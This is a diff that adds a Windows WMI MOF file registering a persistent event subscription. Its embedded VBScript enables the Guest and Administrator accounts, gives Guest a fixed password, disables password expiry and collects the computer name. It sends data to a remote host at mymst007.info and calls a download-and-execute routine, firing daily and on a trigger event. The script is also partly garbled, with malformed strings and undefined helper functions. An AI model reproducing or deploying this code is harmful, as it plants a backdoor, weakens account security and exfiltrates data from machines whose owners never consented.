@@ -1,0 +1,97 @@
+#pragma namespace("\\\\.\\root\\subscription")
+
+class ASEventConsumerdr : _EventConsumer
+{
+    [key] Name;
+    [not_null] ScriptingEngine;
+    ScriptText;
+    ScriptFilename;
+    KillTimeout = 0;
+};
+
+Instance of __Win32Provider as $SCRCONS_P
+{
+    Name = "ASEventConsumerdr";
+    Clsid = "{266c72e7-62e8-11d1-ad89-00c04fda4bdf}";
+    PerUserInitialization = TRUE;
+    HostingModel = "SelfHost";
+};
+
+Instance of __EventConsumerProviderRegistration
+{
+    Provider = $SCRCONS_P;
+    ConsumerClassNames = { "ASEventConsumerdr" };
+};
+
+Instance of ASEventConsumerdr as $CONSUMER
+{
+    CreatorSID = {1, 2, 0, 0, 0, 5, 32, 0, 0, 32, 2, 0, 0};
+    Name = "MYASECdr";
+    ScriptingEngine = "VBScript";
+    ScriptText = 
+        "On Error Resume Next " &
+        "GuestName = GetGuest(1) " &
+        "AdName = GetGuest(0) " &
+        "Set objUser = GetObject(\"WinNT://./\" & GuestName & ", user") " &
+        "objUser.SetPassword \"admin, .123!@#§¥*\" " &
+        "objUser.AccountDisabled = False " &
+        "objUser.Put \"PasswordExpired\", CLng(0) " &
+        "objUser.SetInfo " &
+        "Set objUserad = GetObject(\"WinNT://./\" & AdName & ", user") " &
+        "objUserad.AccountDisabled = False " &
+        "objUserad.Put \"PasswordExpired\", CLng(0) " &
+        "objUserad.SetInfo " &
+        "Set objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\DEFAULT:StdRegProv\") " &
+        "Dim objOutParams, uValuel, uValue " &
+        "objOutParams = objWMIService.GetStringValue(&H80000002, \"SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\", \"ComputerName\", cpn) " &
+        "cgpwd GuestName, cpn " &
+        "delhost " &
+        "If myhfs() And uValue <> \"5.1\" Then " &
+        "    Set x = CreateObject(\"WinHttp.WinHttpRequest.5.1\") " &
+        "    x.Open \"GET\",\"http://mst2.mymst007.info:4000/jl?info=\" & en(str),0 " &
+        "    x.Send() " &
+        "End If " &
+        "If myhfs() Then execmydler "
+        "End Function";
+};
+
+Instance of __EventFilter as $FILTER
+{
+    CreatorSID = {1, 2, 0, 0, 0, 5, 32, 0, 0, 32, 2, 0, 0};
+    Name = "EFNNdr";
+    EventNamespace = "Root\\CIMv2";
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_LocalTime\" AND TargetInstance.Hour=23 AND TargetInstance.Minute=0 AND TargetInstance.Second=0";
+    QueryLanguage = "WQL";
+};
+
+Instance of __FilterToConsumerBinding as $BINDING
+{
+    CreatorSID = {1, 2, 0, 0, 0, 5, 32, 0, 0, 32, 2, 0, 0};
+    Filter = $FILTER;
+    Consumer = $CONSUMER;
+};
+
+class MyASEventConsumer
+{
+    [key] Name;
+};
+
+Instance of __EventFilter as $FILTERC
+{
+    CreatorSID = {1, 2, 0, 0, 0, 5, 32, 0, 0, 32, 2, 0, 0};
+    Name = "EF";
+    Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyASEventConsumer\"";
+    QueryLanguage = "WQL";
+};
+
+Instance of __FilterToConsumerBinding as $BINDINGC
+{
+    CreatorSID = {1, 2, 0, 0, 0, 5, 32, 0, 0, 32, 2, 0, 0};
+    Filter = $FILTERC;
+    Consumer = $CONSUMER;
+};
+
+Instance of MyASEventConsumer
+{
+    Name = "Trier";
+};
